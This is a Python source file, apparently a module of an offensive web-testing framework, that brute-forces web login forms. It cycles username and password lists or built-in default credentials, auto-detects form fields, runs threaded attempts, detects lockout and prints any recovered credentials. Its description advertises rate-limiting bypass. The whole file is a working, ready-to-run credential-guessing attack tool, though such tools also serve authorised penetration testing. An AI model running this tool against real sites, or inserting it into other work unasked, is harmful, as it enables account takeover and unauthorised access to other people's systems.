"""Login form brute force module — attempts username/password combos against login forms."""

from __future__ import annotations
import time
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from webforg.core.module import BaseAuxiliaryModule, Option
from webforg.core.target import Target
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
from rich import box

console = Console()


class Scanner(BaseAuxiliaryModule):
    """Login form brute force — tests username/password combinations against web login forms."""

    name = "Login Form Brute Force"
    description = "Brute force web login forms with username/password lists, rate limiting bypass, and lockout detection"
    author = "K0uR1i"
    rank = "good"

    def _build_options(self) -> None:
        super()._build_options()
        self.add_option("TARGETURI", Option(str, required=False, default="/login", description="Login form URL"))
        self.add_option("USERNAME", Option(str, required=True, description="Single username or file path with usernames (one per line)"))
        self.add_option("PASSWORD", Option(str, required=False, default=None, description="Single password or file path with passwords (one per line)"))
        self.add_option("WORDLIST", Option(str, required=False, default=None, description="Path to password wordlist file"))
        self.add_option("USER_FIELD", Option(str, required=False, default=None, description="Username form field name (auto-detect if empty)"))
        self.add_option("PASS_FIELD", Option(str, required=False, default=None, description="Password form field name (auto-detect if empty)"))
        self.add_option("METHOD", Option(str, required=False, default="POST", description="HTTP method (POST or GET)"))
        self.add_option("FAIL_STRING", Option(str, required=False, default=None, description="String in response that indicates failed login"))
        self.add_option("SUCCESS_STRING", Option(str, required=False, default=None, description="String in response that indicates successful login"))
        self.add_option("THREADS", Option(int, required=False, default=1, description="Number of parallel threads"))
        self.add_option("DELAY", Option(float, required=False, default=0.5, description="Delay between attempts in seconds"))
        self.add_option("MAX_ATTEMPTS", Option(int, required=False, default=100, description="Max attempts before stopping"))

    def _build_url(self) -> str:
        """Build login URL without double slashes."""
        base = self.target.base_url.rstrip("/")
        target_uri = (self.get_option("TARGETURI") or "/login").lstrip("/")
        return f"{base}/{target_uri}"

    def run(self) -> dict:
        url = self._build_url()
        session = self.target.session
        threads = self.get_option("THREADS") or 1
        delay = self.get_option("DELAY") or 0.5
        max_attempts = self.get_option("MAX_ATTEMPTS") or 100

        console.print()
        console.print(f"  [bold red]>[/] Login Brute Force — [bold]{url}[/]")

        # ── Load usernames ──
        usernames = self._load_list(self.get_option("USERNAME"))
        if not usernames:
            return {"success": False, "error": "No usernames loaded"}

        # ── Load passwords ──
        passwords = []
        wordlist = self.get_option("WORDLIST")
        password = self.get_option("PASSWORD")
        if wordlist:
            passwords = self._load_list(wordlist)
        elif password:
            if "/" in password and password.endswith(".txt"):
                passwords = self._load_list(password)
            else:
                passwords = [password]
        else:
            passwords = ["admin", "password", "123456", "root", "toor", "test", "guest", "administrator"]

        total = min(len(usernames) * len(passwords), max_attempts)
        console.print(f"  [dim green]>[/] {len(usernames)} usernames x {len(passwords)} passwords = {total} attempts max")
        console.print()

        # ── Auto-detect form fields ──
        user_field = self.get_option("USER_FIELD")
        pass_field = self.get_option("PASS_FIELD")
        if not user_field or not pass_field:
            user_field, pass_field = self._detect_fields(session, url)
            console.print(f"  [dim green]>[/] Detected fields: user=[bold]{user_field}[/]  pass=[bold]{pass_field}[/]")
        console.print()

        # ── Brute force ──
        results = []
        found = False
        lockout_detected = False
        attempts = 0
        attempts_lock = threading.Lock()
        start_time = time.time()

        fail_string = self.get_option("FAIL_STRING")
        success_string = self.get_option("SUCCESS_STRING")

        def try_combo(combo):
            nonlocal found, lockout_detected, attempts
            if found:
                return None

            user, pwd = combo

            with attempts_lock:
                if attempts >= max_attempts:
                    return None
                attempts += 1

            try:
                if (self.get_option("METHOD") or "POST").upper() == "POST":
                    data = {user_field: user, pass_field: pwd}
                    resp = session.post(url, data=data, timeout=10)
                else:
                    params = {user_field: user, pass_field: pwd}
                    resp = session.get(url, params=params, timeout=10)

                body = resp.text.lower()
                status = resp.status_code

                # Check for lockout
                if status == 429 or "locked" in body or "too many" in body or "rate limit" in body:
                    lockout_detected = True
                    return {"username": user, "password": pwd, "status": "LOCKED", "details": "Account locked or rate limited"}

                # Check success
                if success_string:
                    if success_string.lower() in body:
                        found = True
                        return {"username": user, "password": pwd, "status": "FOUND", "details": f"HTTP {status}"}
                else:
                    if fail_string:
                        if fail_string.lower() not in body and status in (200, 302):
                            found = True
                            return {"username": user, "password": pwd, "status": "FOUND", "details": f"HTTP {status}"}
                    else:
                        if status in (301, 302, 303) and "login" not in resp.url.lower():
                            found = True
                            return {"username": user, "password": pwd, "status": "FOUND", "details": f"Redirected to {resp.url}"}

                return {"username": user, "password": pwd, "status": "FAIL", "details": f"HTTP {status}"}

            except Exception as e:
                return {"username": user, "password": pwd, "status": "ERROR", "details": str(e)[:40]}

        # Generate combos lazily to avoid memory explosion
        def combo_generator():
            for u in usernames:
                for p in passwords:
                    if found:
                        return
                    yield (u, p)

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold green]{task.description}[/]"),
            BarColumn(bar_width=30),
            MofNCompleteColumn(),
            TextColumn("•"),
            TextColumn("[bold]{task.fields[speed]}[/]"),
        ) as progress:
            task = progress.add_task("Brute forcing", total=total, speed="0/s")

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = {}
                submitted = 0
                for combo in combo_generator():
                    if found or submitted >= max_attempts:
                        break
                    future = executor.submit(try_combo, combo)
                    futures[future] = combo
                    submitted += 1
                    if threads == 1 and delay > 0:
                        time.sleep(delay)

                for future in as_completed(futures):
                    try:
                        result = future.result()
                    except Exception:
                        continue
                    if result:
                        results.append(result)
                        speed = f"{attempts / max(time.time() - start_time, 0.01):.1f}/s"
                        progress.update(task, advance=1, speed=speed)
                        if result["status"] == "LOCKED":
                            lockout_detected = True
                            console.print(f"\n  [bold yellow]>[/] Lockout detected after {attempts} attempts!")
                            break

        elapsed = time.time() - start_time

        # ── Results ──
        found_creds = [r for r in results if r["status"] == "FOUND"]
        table = Table(title="Brute Force Results", box=box.ROUNDED, border_style="bold red")
        table.add_column("Username", style="bold cyan")
        table.add_column("Password", style="bold yellow")
        table.add_column("Status", width=10)
        table.add_column("Details")

        for r in results:
            if r["status"] in ("FOUND", "LOCKED"):
                status_style = f"[bold green]{r['status']}[/]" if r["status"] == "FOUND" else f"[bold yellow]{r['status']}[/]"
                table.add_row(r["username"], r["password"], status_style, r["details"])

        console.print(table)

        summary_parts = [
            f"[bold]Attempts:[/] {attempts}/{total}",
            f"[bold]Found:[/] {len(found_creds)}",
            f"[bold]Time:[/] {elapsed:.1f}s",
        ]
        if lockout_detected:
            summary_parts.append("[bold yellow][!] Lockout detected -- increase delay[/]")
        console.print(Panel("  ".join(summary_parts), border_style="bold red"))

        if found_creds:
            console.print()
            for r in found_creds:
                console.print(f"  [bold green][OK] FOUND:[/] {r['username']}:{r['password']}")

        return {
            "success": True,
            "found": found_creds,
            "attempts": attempts,
            "lockout_detected": lockout_detected,
            "elapsed": elapsed,
        }

    def _load_list(self, path_or_value: str) -> list[str]:
        """Load a list from file or return as single item."""
        if not path_or_value:
            return []
        path_or_value = path_or_value.strip()
        if "/" in path_or_value or path_or_value.endswith(".txt"):
            try:
                with open(path_or_value, "r") as f:
                    return [line.strip() for line in f if line.strip()]
            except FileNotFoundError:
                console.print(f"  [bold red]>[/] File not found: {path_or_value}")
                return []
        return [path_or_value]

    def _detect_fields(self, session, url: str) -> tuple[str, str]:
        """Auto-detect username and password form fields."""
        user_field = "username"
        pass_field = "password"
        try:
            resp = session.get(url, timeout=10)
            inputs = re.findall(r'<input[^>]*>', resp.text, re.IGNORECASE)
            for inp in inputs:
                name_match = re.search(r'name=["\']([^"\']+)["\']', inp)
                type_match = re.search(r'type=["\']([^"\']+)["\']', inp)
                if name_match:
                    name = name_match.group(1).lower()
                    input_type = type_match.group(1).lower() if type_match else "text"
                    if input_type == "password":
                        pass_field = name_match.group(1)
                    elif any(kw in name for kw in ("user", "login", "email", "account")):
                        user_field = name_match.group(1)
                    elif input_type == "text" and user_field == "username":
                        user_field = name_match.group(1)
        except Exception:
            pass
        return user_field, pass_field
